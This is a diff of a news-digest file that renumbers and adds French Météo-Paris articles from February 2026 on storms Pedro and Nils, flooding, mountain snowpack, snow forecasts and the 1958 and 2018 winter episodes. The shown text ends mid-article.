-### 14. `FR` [Tempête Pedro : la goutte d'eau de trop !](data/articles/ee486785b0f65bd0ea3aa1c8e7f133fe.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Une dépression très creuse va apporter des vents forts et de nouvelles pluies abondantes sur la France en milieu de semaine Vents forts et nouvelles pluies intenses sont attendues au passage d'une dépression bien creuse sur la France entre mercredi 18 et jeudi 19 février 2026. Le niveau de certains cours d'eau étant déjà très élevé, cette nouvelle tempête laisse craindre le pire. Un temps restant agité dans les prochains jours L’influence océanique perturbée persiste en cette mi-février. Sous l’effet d’un courant jet survolant la France, de nouvelles perturbations sont attendues dans les prochains jours, avec plusieurs zones dépressionnaires circulant sur l’ouest de l’Europe jusqu’au week-end. La situation nécessitera une vigilance particulière entre mercredi et jeudi. Une dépression secondaire devrait se former rapidement en marge d’une zone dépressionnaire au large de l’Irlande, se dirigeant vers la Bretagne puis vers l’Italie jeudi. Cette dépression assez creuse devrait entraîner un temps très agité sur le pays, marqué par des vents forts et de fortes précipitations. Vents parfois forts, en limite du niveau de tempête Alors qu’un creusement dépressionnaire notable se dirige vers notre pays, les vents vont se renforcer sur une partie ouest et sud de la France entre mercredi et jeudi. Les vents les plus forts devraient suivre une trajectoire similaire à celle de la tempête Nils, mais heureusement, ils ne devraient pas atteindre la même intensité. C'est donc notamment entre la façade Atlantique, le sud-ouest et les abords de la Méditerranée que les rafales les plus fortes sont attendues entre mercredi soir et jeudi avec parfois plus de 90-100 voire 140 km/h sur les secteurs les plus exposés. Ceci restera néanmoins à confirmer d'ici là. Rafales maximales de vent prévues d'ici vendredi matin, selon le modèle météo européen - via Meteociel Des pluies abondantes et une aggravation des inondations Outre les vents parfois forts, il conviendra également de surveiller le risque de nouvelles fortes précipitations au passage de cette dépression sur notre pays. En effet, entre les pluies parfois abondantes de ce lundi, surtout sur le sud et l'est de la France et le passage de la dépression PEDRO, les cumuls de précipitations s'annoncent de nouveau très importants entre mardi midi et jeudi soir, y compris dans le bassin de la Seine et de la Loire. Cumuls de précipitations attendus entre mardi matin et jeudi soir – Modèle européen via Meteociel Or, ces précipitations toucheront des secteurs déjà particulièrement durement touchées ces dernières semaines, secteurs où les inondations sont déjà nombreuses et parfois importantes depuis la semaine dernière. C'est notamment le cas d'une large partie ouest de la France où la quasi-totalité des cours d'eau sont en crue et où la Garonne, la Loire Saumuroise et les basses vallées angevines subissent une crue historique. Carte Vigicrues du 18 février 2026 à 09h56 Les précipitations de ce début de semaine, suivies du passage de la dépression entre mercredi et jeudi, risquent d’aggraver considérablement la situation actuelle dans ce secteur, laissant craindre des crues généralisées et potentiellement importantes. Un coefficient de marée et une forte houle aggravant la situation Et comme si cela ne suffisait pas, ces intempéries surviennent au plus mauvais moment. Bien qu’il ne s’agisse pas de marées d’équinoxe, les coefficients restent particulièrement élevés (96 et 97), et la houle générée par cette dépression profonde pourrait dépasser les 6 mètres de hauteur sur la façade Atlantique jeudi matin. Cette situation risque de freiner l’écoulement des cours d’eau et, par conséquent, d’aggraver encore davantage les inondations. À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Vers les 5 m de neige en haut de certaines stations de ski ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 15. `FR` [Pourquoi pleut-il autant depuis le début de l'année ?](data/articles/f1dd309871e590f5e4636c0fe9e1d43a.html)
+### 3. `FR` [Pourquoi pleut-il autant depuis le début de l'année ?](data/articles/f1dd309871e590f5e4636c0fe9e1d43a.html)
 **Source:** Météo-Paris | **Keyword:** `Local`
 La pluie n'en finit plus de tomber sur la France, causant des crues majeures dans la moitié ouest. expliquer qu'il pleut autant depuis le début de l'année et cette situation est-elle exceptionnelle ? Notre article vous explique. Une circulation atmosphérique atypique Depuis le début de l'année 2026, le courant jet circule à des latitudes plus basses qu'en temps normal. Il a longuement ondulé de la côte est des États-Unis vers les Açores avant de passer par la péninsule ibérique et la Méditerranée. Ainsi, il a permis aux dépressions de s'enchaîner sur la péninsule ibérique et la Méditerranée avec des pluies affectant une grande partie de la France. En remontant quelque peu, ce jet passe désormais au dessus de la France et maintient l'agitation. De plus, ajoutons que les vagues de froid nord-américaines ont dynamisé l'activité dépressionnaire sur l'Atlantique. En arrivant au dessus de l'océan, l'air polaire favorise le creusement des dépressions, qui traversent ensuite l'Atlantique vers l'Europe. Schéma montrant la circulation basse en latitude du courant jet fin janvier et début février 2026 - Météo Villes Ainsi, cela fait maintenant plusieurs semaines que l'activité dépressionnaire est particulièrement marquée sur notre pays et globalement sur tout l'ouest de l'Europe. Sur la période du 1er janvier au 15 février 2026, l'anomalie de pression atteint -19 hPa par rapport à la normale au large de la Bretagne ! Un tel déficit sur une période de 45 jours est spectaculaire et témoigne de l'activité dépressionnaire hors norme qu'a subi la France. Si vous consultez régulièrement votre baromètre, vous avez surement remarqué que la pression est souvent très basse depuis le début de l'année 2026. Anomalie de pression du 1er janvier au 15 février 2026 - keraunos.org Des cumuls de pluie vraiment remarquables Sur les 45 premiers jours de l'année, 39 ont enregistré au moins 1 mm de pluie en moyenne nationale ! Cela signifie que 87% des jours ont été pluvieux en France depuis le début 2026, un chiffre remarquable ! Non seulement la pluie a été anormalement fréquente mais elle est aussi anormalement abondante. La Bretagne symbolise cet excès de pluie avec des cumuls tout bonnement remarquables. Au 18 février, il est déjà tombé 566 mm de pluie à Quimper depuis le début de l'année ! Cela représente 260% du cumul normal, c'est à dire qu'il est tombé 2,6 fois plus de pluie que lors d'un début d'année moyen ! Jamais de telles pluies n'avaient été observées depuis le début des mesures. Sur le graphique ci-dessous, on note l'absence d'accalmie avec des courbes qui croissent presque continuellement. Cumuls de pluie sur plusieurs villes bretonnes depuis le début de l'année 2026 - Le Parisien Autre indicateur qui permet de montrer que ce début d'année 2026 est véritablement exceptionnel : l'indice d'humidité des sols atteint des records. En effet, en date du 17 février 2026, l'indice moyenné à échelle nationale est à son plus haut niveau depuis le début des mesures pour cette époque de l'année. D'ailleurs, il arrive même sur le podium des situations où les sols ont été les plus humides en France, toutes dates confondues. Seuls décembre 1982 et janvier 1994, théâtres de graves inondations, avaient connu une humidité moyenne légèrement supérieure à la situation actuelle. Indice d'humidité des sols en moyenne nationale du 18 février 2025 au 17 février 2026 - Météo France En résumé : la situation actuelle est véritablement remarquable avec des crues spectaculaires générées par des pluies parfois records, elles-mêmes liées à une séquence remarquablement dépressionnaire, tant par son intensité que sa durée. À lire également : &gt;&gt;&gt; Tempête Pedro : la goutte d'eau de trop ! &gt;&gt;&gt; Le blizzard meurtrier de la fin février 1958 &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; Vers les 5m de neige en haut de certaines stations de ski ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
 
@@ -3364,7 +3286,7 @@ La pluie n'en finit plus de tomber sur la France, causant des crues majeures dan
 
 <div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
 
-### 16. `FR` [Le blizzard meurtrier de la fin février 1958](data/articles/bf013eb89e9030c32143d213a714c0a4.html)
+### 4. `FR` [Le blizzard meurtrier de la fin février 1958](data/articles/bf013eb89e9030c32143d213a714c0a4.html)
 **Source:** Météo-Paris | **Keyword:** `Local`
 Après plusieurs journées aux allures de printemps, marquées par une douceur exceptionnelle — jusqu’à 18 °C à Paris le 18 février 1958 — la situation bascule brutalement. Une masse d’air polaire déferle par le nord et le thermomètre s’effondre de 12 °C en seulement quelques heures. Tout le Nord-Pas-de-Calais paralysé après une nuit de cauchemar Dans la nuit du 25 au 26 février 1958, une violente tempête de neige frappe toute la moitié nord de la France, et particulièrement le Nord-Pas-de-Calais. En quelques heures, 10 à 15 cm de neige tombent, balayés par des rafales proches de 120 km/h. D’immenses congères se forment, bloquant routes et autoroutes. Des centaines d’automobilistes se retrouvent piégés dans leur véhicule, incapables d’avancer ou de faire demi-tour. En pleine nuit, des milliers de voitures sont abandonnées en rase campagne. Le bilan est dramatique : quatre personnes perdent la vie. Robert Lamoureux, Jeanne Moreau et Louis Malle pris dans la tempête de neige Parmi les conducteurs pris au piège figure le fantaisiste Robert Lamoureux. En route de Bruxelles vers Paris au volant de sa voiture américaine, il se heurte à un véritable mur de neige près de Baisieux. Alors qu’il tente de se dégager, son véhicule s’embrase. Il réussit à s’extraire à temps, échappant de justesse à la catastrophe. Jeanne Moreau et Louis Malle vivent eux aussi une nuit éprouvante. Après s’être rendus à Lille pour présenter le film « Ascenseur pour l’échafaud », dont elle est la vedette et lui le réalisateur, ils prennent la direction de Thumeries, au sud de Lille, où réside la famille de Louis Malle. Leur voiture est immobilisée par la neige près de Seclin. Ils ne seront secourus que le lendemain matin, vers 8 heures, par un camionneur, transis de froid. La DS ensevelie par la neige et dans laquelle Jeanne Moreau et Louis Malle ont été pris au piège durant une nuit, transis de froid - archives meteo-paris.com Cet épisode marque également un tournant médiatique. À la suite de cette tempête, Paul Douchy, prévisionniste à la Météorologie nationale, commence à présenter la météo quotidiennement à la télévision. Jusqu’alors, depuis le 17 décembre 1946, ce rendez-vous n’était proposé qu’une fois par semaine. Une évolution emblématique d’une télévision française en plein essor, désormais présente dans près d’un million de foyers. Une neige abondante également entre Paris et les régions de l'Est Paris n’est pas épargnée : près de 10 cm de neige recouvrent la capitale, sous des rafales dépassant 115 km/h. Les fortes chutes concernent également l’est du pays — notamment l’Ain, le Doubs et le Jura — où l’épaisseur du manteau neigeux atteint localement 50 à 60 cm. 20 jours plus tôt (le 7 février 1958) l'Alsace connaissant également une tempête de neige particulièrement marquée - archives meteo-paris.com A lire également : &gt;&gt;&gt; Chronique météo de l'année 1958 &gt;&gt;&gt; Notre almanach météo &gt;&gt;&gt; Compte X @Meteovilles Auteur : Guillaume Séchet
 
@@ -3372,7 +3294,39 @@ Après plusieurs journées aux allures de printemps, marquées par une douceur e
 
 <div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
 
-### 17. `FR` [Vigilance neige pour dimanche, et pas seulement](data/articles/4456f69aadf69276bd5fdd6e788750d6.html)
+### 5. `FR` [Vers les 5 m de neige en haut de certaines stations de ski ?](data/articles/40cb1c77e271dff889101cecddf690be.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+La neige est très abondante à Val d'Isère en Savoie actuellement ! - Photographie : Station Val d'Isère Même si la neige reste timide en plaine depuis le début du mois de janvier sur la France, le constat est tout autre en montagne. Avec le temps très humide et perturbé de ces dernières semaines, la neige se montre en effet particulièrement abondante sur la majorité de nos massifs, notamment en moyenne montagne où l'épaisseur est parfois impressionnante, même pour une mi-février. Nous vous proposons donc un petit tour de nos massifs. Enneigement MOYEN par massif en bas et en haut des pistes au vendredi 13 février 2026 - relevés Météo-France Voici la liste des stations de sports d'hiver les plus enneigées en haut des pistes (source : Meteo-France) : Piau Engaly : 350 cm La Rosière 1850 : 300 cm Puy Saint-Vincent : 279 cm Saint-François-Longchamp : 265 cm Bonneval sur Arc : 262 cm Flaine : 260 cm Alpe d’Huez : 255 cm Praloup : 255 cm Arêches-Beaufort : 240 cm Chamrousse : 237 cm Les 2 Alpes : 235 cm Alpes C'est sur la partie nord du massif que les quantités de neige sont les plus importantes en station en cette mi-février 2026. On relève en effet en général entre 90 et 110 cm de neige en bas des pistes de la Haute-Savoie au Queyras en passant par l'Isère, parfois plus comme au Grand-Bornand (74) à 1430m d'altitude où on mesure 155 cm de neige ce 13 février. Les quantités sont en général comprises entre 200 et 300 cm en haut des pistes, là aussi des valeurs particulièrement élevées. L'enneigement est exceptionnel à La Rosière (Savoie), ce vendredi 13 février 2026 - cliché Alexandra Brochard via @MeteoExpress Attention toutefois, ces quantités de neige particulièrement importantes entraînent un risque d'avalanche très élevé en cette fin de semaine. Plusieurs avalanches notables ont d'ailleurs été observées ce jeudi 12 février sur le nord des Alpes. Le sud du massif n'est pas non plus en reste avec là aussi des quantités notables. On mesure en général entre 40 et 60 cm de neige en bas des pistes dans les stations des Alpes-de-Haute-Provence et des Alpes-Maritimes et jusqu'à 200 cm sur les sommets. La nivôse de Millefonts (06) mesure par exemple 147 cm de neige à 2430 m d'altitude, soit 86 cm de plus que l'année dernière à la même période ! Pyrénées Le massif pyrénéen est également particulièrement concerné par les chutes de neige ces dernières semaines. Que ce soit l'est ou l'ouest du massif, toutes les stations observent d'importantes quantités de neige en cette mi-février 2026. Certains secteurs des Pyrénées-Orientales ont même relevé des quantités de neige qui n'avaient plus été vues depuis près de 30 ans et d'autres ont atteint des records au début du mois de février ! Si les quantités restent raisonnables en bas des pistes (entre 20 et 40 cm en général) en raison de plusieurs redoux plus ou moins notables depuis le début du mois de février, on relève le plus souvent 200 à 250 cm de neige sur les sommets ! Corse Comme pour les Pyrénées et les Alpes, le temps agité et très humide de ces dernières semaines a apporté une couche de neige particulièrement importante sur les massifs de l'île de beauté. Celle-ci est même plus importante que dans certains massifs alpins avec en général entre 30 et 50 cm à moyenne altitude et jusqu'à 250 cm sur sommets de la région, localement plus ! On relève par exemple 277 cm à la nivôse de Maniccia (2360m), 157 cm de plus que l'année dernière à la même date et presque 2 m de plus qu'en février 2024 ! La station de Bastelica dans le Val d'Ese a même pu rouvrir ses portes au début du mois de février après 3 ans sans neige ! Les autres massifs français sont malheureusement un peu moins bien fournis en terme de neige car moins élevés. L'air globalement assez doux pour la période a en effet limité les chutes de neige abondante sur le Jura, les Vosges et le Massif Central ces dernières semaines en plus de quelques journées de pluie jusqu'aux sommets de ces massifs, entraînant un lessivage parfois notable. On ne relève en général pas plus de 20-25 cm sur les sommets de ces reliefs, ce qui est à contrario déficitaire. Encore et toujours des chutes de neige en vue ! D'autres chutes de neige abondantes sont prévues d'ici la fin du mois (et notamment d'ici le 24 février) à tel point qu'il pourrait encore tomber 1 m à 2,50 m supplémentaires en haut des pistes, notamment sur le nord des Alpes et l'Ouest des Pyrénées ! Les épaisseurs pourraient ainsi atteindre localement 5 m voire davantage... Cumuls de neige attendus en montagne jusqu'au 24 février 2026 - Allosurf À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 6. `FR` [Vigilance rouge pour la tempête Nils avec des vents à plus de 150 km/h](data/articles/1c28d0c249284b7af161c9130b27da38.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+La tempête Nils s'apprête à frapper la France. Elle débutera par l'arc atlantique durant la nuit du mercredi 11 au jeudi 12 février 2026 avant de s'enfoncer en Méditerranée. Dans certains secteurs, les rafales pourront atteindre les 150 km/h ! Tempête de l'Atlantique à la Méditerranée Associée à un vaste zone dépressionnaire, la tempête Nils se présentera sous la forme d'un minimum dépressionnaire qui se creusera au large de nos côtes atlantiques ce mercredi 11 février 2026. Ce dernier s'enfoncera en Manche durant la nuit du mercredi 11 au jeudi 12 février avec un cœur centré autour de 975 hPa. La dépression se décalera ensuite vers le nord de l'Italie. Les vents les plus forts frapperont d'abord l'arc atlantique avant de s'enfoncer sur le sud-ouest de la France puis le bassin méditerranéen. Position de la tempête Nils durant la nuit du mercredi 11 au jeudi 12 février 2026 - meteoblue Ainsi, les rafales tempétueuses débuteront en nuit du mercredi 11 au jeudi 12 février 2026 sur l'arc atlantique avec 100 à 120 km/h, parfois 130 km/h voire très ponctuellement 140 km/h sur le littoral aquitain ! Ces vents tempétueux vont s'enfoncer sur le sud-ouest avec des pointes de 100-110 km/h au sud de la Garonne jusqu'à jeudi matin. C'est dans le domaine de la tramontane et sur l'ouest des Cévennes que la tempête sera la plus violente avec des rafales de 120 à 140 km/h voire 150-160 km/h sur les sommets jusqu'à jeudi après-midi ! Des rafales du même d'ordre frapperont ensuite la montagne corse et les extrémités de l'île. Notons que dans toutes les régions de l'ouest et du centre de la France, des pointes de 80 à 90 km/h (voire localement 100 km/h) pourront être enregistrées. Rafales maximales générées par la tempête Nils en nuit et journée du jeudi 12 février 2026 - Météo Villes Vigilance rouge dans l'Aude ! Ainsi, les services de Météo France ont placé 17 départements allant de la Vendée à la Corse en vigilance orange tempête, débutant en fin de soirée du mercredi 11 février 2026 et se prolongeant jusqu'en fin de journée du jeudi 12 février. L'Aude a été placée en vigilance ROUGE, ce jeudi 6h à 14h avec des pointes de 150 km/h prévues sur la plaine ! Par ailleurs, de très nombreux départements sont en vigilance orange crues. La Garonne marmandaise a même été placée en vigilance ROUGE crue ! Haute-Savoie, Savoie, Isère et Hautes-Alpes sont en vigilance orange avalanches. Carte de vigilance valable ces mercredi 11 et jeudi 12 février 2026 (tempête Nils) - Météo France Avec de telles rafales de vent, il faut s'attendre à des dégâts, en particulier des côtes atlantiques vers le domaine de la tramontane. De plus, cette tempête interviendra dans un contexte très compliqué. En effet, les précipitations abondantes rendent les sols saturés en eau et donc particulièrement meubles. Ainsi, les racines sont moins bien ancrées dans le sol et le vent peut déraciner plus facilement les arbres. Il faut donc s'attendre à de nombreuses chutes d'arbres au passage de cette tempête Nils. Les sols gorgés en eau sont plus meubles et favorisent le déracinement des arbres par le vent À lire également : &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 7. `FR` [1 mort et de gros dégâts : la tempête Nils a frappé fort !](data/articles/26840bf4bdb49b2e35e8c901b9fd934b.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Voiture écrasée par un arbre à Perpignan au passage de la tempête Nils ce jeudi 12 février 2026 - photo Arpy Cod La tempête Nils a frappé encore plus durement que prévu dans le sud-ouest de la France et jusqu'en Méditerranée. On a mesuré jusqu'à 180 km/h dans les Pyrénées-Orientales et une personne a perdu la vie dans les Landes. Jusqu'à 180 km/h : Nils encore plus forte que prévu ! Les services de Météo France avait anticipé la virulente de la tempête Nils, plaçant la Vendée et de nombreux départements du sud-ouest de la France ainsi que la Corse en vigilance orange tempête. Le département de l'Aude avait été placé en vigilance ROUGE dès mercredi après-midi. À la vue des rafales de vent encore plus importantes que prévu, l'alerte rouge a été étendue aux départements des Pyrénées-Orientales jeudi matin. Carte de vigilance en vigueur le matin du jeudi 12 février 2026 - Météo France Et pour cause, les rafales de vent enregistrées au passage de la tempête Nils ont dépassé la prévision ! Dans la nuit, le sud-ouest a subi des rafales remarquables avec 157 km/h au Cap Ferret sur le littoral aquitain ! Ces vents très violents ne se sont pas limités à la côte. Dans les terres, on a mesuré 132 km/h à Toulouse, 134 km/h à Tarbes, 136 km/h à Mont-de-Marsan et 145 km/h à Pau ! Le matin, Aude et Pyrénées-Orientales ont subi des vents remarquables avec 149 km/h à Perpignan, 158 km/h à Leucate et même jusqu'à 180 km/h à Caixas ! Bien souvent, il s'agit de la plus forte tempête dans ces régions depuis Klaus en 2009 ! La Corse fut aussi fortement affectée jusqu'à 185 km/h à Cagnano dans le Cap Corse ! Rafales maximales de la tempête Nils le jeudi 12 février 2026 - keraunos.org 1 victime et de gros dégâts Les vents particulièrement puissants ont causé de très nombreuses chutes d'arbres dans tout le sud-ouest de la France et près de la Méditerranée. De plus, les sols gorgés en eau ont rendu le déracinement des arbres plus aisé. En matinée du jeudi 12 février 2026, la circulation a été fortement perturbée sur de nombreux axes routiers, y compris sur l'A9 où plusieurs pins sont tombés sur les voies. Un poids lourd a percuté l'un d'eux, blessant légèrement son chauffeur. Plus tôt dans la nuit, un routier de 55 ans a perdu la vie dans les Landes, touché par la chute d'un arbre traversant son pare-brise. Poids lourd ayant percuté un pin tombé sur l'A9 à Lespignan (34) le matin du jeudi 12 février 2026 - photo SDIS34 L'intensité de cette tempête a surpris autant les habitants que les météorologues avec des rafales un ou deux crans au dessus des valeurs initialement prévues. Les chutes d'arbres se comptent par milliers dans le sud-ouest de la France, y compris dans les grandes villes. Celles-ci ont occasionné de très nombreuses pannes d'électricité. En matinée du jeudi 12 février 2026, jusqu'à 900.000 foyers étaient privés d'électricité ! Arbre abattu par la tempête Nils à Salses-le-Château (66) ce jeudi 12 février 2026 - photo Jean-Sébastien Gantou À lire également : &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 8. `FR` [Chutes de neige mercredi au nord de la Seine](data/articles/4f54bfa657e8b886ea840d64c1ea3399.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Après l’épisode neigeux de dimanche (qui a finalement été moins important que prévu), la douceur est revenue rapidement. Cependant, de nouvelles chutes de neige pourraient se produire en limite de l’air froid mercredi matin. Un conflit avec l'air froid sur le nord de la France Dès mardi soir, de l’air froid en provenance de Scandinavie descendra vers l’Allemagne et la Belgique, et pourrait toucher toutes les régions situées au nord de la Seine. Dans cette zone, les températures seront négatives, tandis qu’au sud de la Loire, il fera facilement plus de 10°C. Les régions autour de la Seine seront donc au cœur d’un conflit avec des températures autour de 0 à 1°C et des précipitations causées par une dépression en Manche. Ces précipitations pourraient se transformer en neige, notamment en raison de l’isothermie engendrée par l’intensité et la persistance de ces dernières. Dans ce type de situation, tout est possible, car la formation de la neige dépend de la température et de l’intensité des précipitations. L'étendue et la localisation des chutes de neige régions dépendront également de la position de la dépression. Position des masses d'air à 850 hPa prévues par le modèle MÉTÉO européen pour mercredi matin - fond de carte Meteociel, retravaillé par Meteo-villes Une zone de neige possible au niveau de la Seine ou au nord Depuis trois ou quatre jours, le modèle météo européen prévoit des chutes de neige au nord de la Seine, sur une bande d'environ 150 km de large. Ce secteur est souvent le théâtre de confrontations hivernales entre l’air froid scandinave et la douceur océanique, ce qui peut entraîner d’importantes chutes de neige. Les exemples ne manquent pas… Évolution des épaisseurs de neige prévues par le modèle MÉTÉO américain entre mercredi 00h et jeudi 7h - fond de carte Meteociel, retravaillé par Meteo-villes Selon les cartes de prévision des épaisseurs de neige du modèle météo européen pour mercredi matin, il pourrait tomber entre 1 et 10 cm de neige dans cette zone. Cependant, cette carte pourrait exagérer les chutes de neige, comme ce fut le cas lors de l’épisode de dimanche matin. Ces prévisions dépendent évidemment du conflit, mais surtout des températures. Il est donc possible que seuls les plateaux situés à plus de 100 m d’altitude soient blanchis. Dans ce type de situation, les vallées connaissent généralement des températures trop élevées pour que la neige tienne réellement au sol. Épaisseurs de neige prévues par le modèle MÉTÉO européen pour mercredi matin - fond de carte Meteociel, retravaillé par Meteo-villes Le modèle américain envisage de la neige un peu plus au nord Le modèle météo européen n’est pas le seul à prévoir de la neige ce mercredi matin. Le modèle américain, quant à lui, anticipe un conflit à peu près calé sur la même zone, mais avec des épaisseurs qui semblent plus réalistes. Soyons honnêtes, certains modèles ne prévoient aucune neige, car les températures seraient trop élevées pour sa formation. Dans ces situations « limites », les prévisions météo sont délicates, même à quelques heures d’échéance. Épaisseurs de neige prévues par le modèle MÉTÉO américain pour mercredi matin - fond de carte Meteociel, retravaillé par Meteo-villes A lire également : &gt;&gt;&gt; Une autre offensive hivernale possible en milieu de semaine &gt;&gt;&gt; Vigilance neige pour dimanche, et pas seulement &gt;&gt;&gt; Bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Encore une tempête pour mercredi et jeudi ! Auteur : Guillaume Séchet
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 9. `FR` [Vigilance neige pour dimanche, et pas seulement](data/articles/4456f69aadf69276bd5fdd6e788750d6.html)
 **Source:** Météo-Paris | **Keyword:** `Local`
 La neige du mardi 6 février 2018 au soir à Paris 9e (square Montholon) - archives meteo-paris.com Nous avons choisi de vous présenter des cartes précises d’épaisseur de neige prévue d’ici la fin du mois de février, non pas par démagogie (car nous sommes conscients que ces scénarios évolueront dans les prochains jours), mais pour illustrer la tendance qui se dessine pour la fin du mois. En effet, tous les modèles météorologiques prévoient au moins deux ou trois épisodes de neige en plaine, bien que les timings, les épaisseurs et les régions concernées varient d’un modèle à l’autre. Nous avons opté pour le scénario du modèle météorologique européen, car il sert de référence aux prévisions nationales, même s’il est loin d’être parfait. Neige de dimanche : éphémère avec des différences selon les prévisions Les chutes de neige de dimanche toucheront principalement les régions du Nord au Massif central, en matinée, avant de se décaler vers le nord-est l’après-midi. Depuis quelques heures la plupart des scénarios indiquent des épaisseurs plus importantes et suivent le modèle météo européen qui a toujours été plus neigeux que les autres. Les fourchettes basses des météo arpège, européen et Icône indiquent des épaisseurs comprises entre 0 et 3 cm. Simulation de l'épaisseur de neige prévue pour dimanche 15 février par le modèles météo ARPÈGE (français) - Meteociel En revanche, les fourchette hautes du modèle météo arôme indiquent 1 à 10/12 cm : presque rien dans les vallées (et peut-être seulement une neige ne tenant pas au sol dans Paris) et jusqu'à 10 cm sur certains plateaux. Cette possible grande différence sera liée à la température au moment où auront lieu les précipitations, car il fera entre 0 et +1°C. Il suffira donc de sortir de l'îlot de chaleur des agglomérations et de monter sur les plateaux à plus de 100 à 150 m d'altitude pour passer d'un paysage sans neige à un paysage très enneigé. Simulation de l'épaisseur de neige prévue pour dimanche 15 février par les modèles météo ARÔME (français) et européen - Meteociel Nouvelles possibilités de neige la semaine prochaine Cet épisode neigeux sera suivi d’un puissant redoux, mais temporaire. La semaine prochaine, la France se trouvera entre l’air doux au sud et l’air plus froid au nord, au cœur d’un puissant courant hésitant entre une influence océanique polaire et une influence océanique des Açores. Une nouvelle chute de neige pourrait avoir lieu au nord de la Seine mercredi matin, car une dépression pourrait circuler sur ces régions, apportant de la neige au nord de son centre. Samedi 21 ou dimanche 22, une descente froide pourrait également se produire, accompagnée d’une forte instabilité et de possibles averses de neige jusqu’en plaine, notamment entre le Massif central et les régions du nord-est. Plusieurs possibilité également pour la fin du mois Enfin, en milieu de semaine suivante (aux alentours de mercredi 25 ou jeudi 26 février), le courant océanique pourrait être particulièrement vigoureux, mais l’air froid resterait sur le nord de la France, avec des scénarios très neigeux au nord de la Seine. Selon le modèle météo Européen, les deux tiers de la France seraient sous la neige sur cette carte. Il s'agit ici d'un scénario assez isolé, mais qui mérite d'être signalé. A lire également : &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; bulletin national quotidien &gt;&gt;&gt; Notre chronique météo &gt;&gt;&gt; Notre compte Twitter Auteur : Guillaume Séchet
 
@@ -3380,9 +3334,73 @@ La neige du mardi 6 février 2018 au soir à Paris 9e (square Montholon) - arc
 
 <div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
 
-### 18. `FR` [Menace de tempête sur la moitié sud pour jeudi](data/articles/cdf91c9564500e4622405ddee5ea20ad.html)
+### 10. `FR` [Février 2018 : la dernière "vraie" vague de froid !](data/articles/5d56e562b9a6fd7308787099cd8417da.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Le dernier mois réellement hivernal en France remonte à février 2018, marqué par deux épisodes importants de chutes de neige et par des températures particulièrement basses, atteignant des niveaux qui n’ont pas (encore) été observés cette année. Sur les 95 vagues de froid observées en France depuis 1900, seule une vague de froid a été observée après 2015 et aucune depuis 2020… La dernière, date donc de février 2018... Source : Serge Saka Une première vague de froid au début du mois Entre le 4 et le 9 février 2018, la France replonge en plein hiver. Un puissant épisode de froid et de neige concerne près des deux tiers du pays, paralysant temporairement plusieurs régions. Tout commence le 5 février, lorsqu’une perturbation venue de Méditerranée remonte vers le nord. La neige tombe jusqu’en plaine sur le Massif central, gagne la vallée du Rhône, la Bourgogne, puis atteint l’Île-de-France en fin de journée. Le 6 février, la situation se complique nettement. Un épisode neigeux majeur frappe l’Île-de-France et les Pays de la Loire. Les chutes deviennent soutenues et tiennent au sol, y compris dans la capitale. Les conséquences sont spectaculaires : un record de 739 kilomètres d’embouteillages est enregistré autour de Paris, piégeant de nombreux automobilistes. Au matin du 7 février, le paysage est est blanc sur les 2/3 du territoire avec une épaisseurs de neige remarquables dans le Bassin parisien. On mesure jusqu’à 25 cm de neige localement, notamment à Vendôme, Dreux ou Versailles, et 12 cm à Paris-Montsouris. Le 8 février, le ciel se dégage mais le froid s’intensifie. Sur des sols enneigés, les températures plongent entre –13°C et –14°C localement, et descendent autour de –6°C à –7°C dans les aéroports parisiens. Enfin, le 9 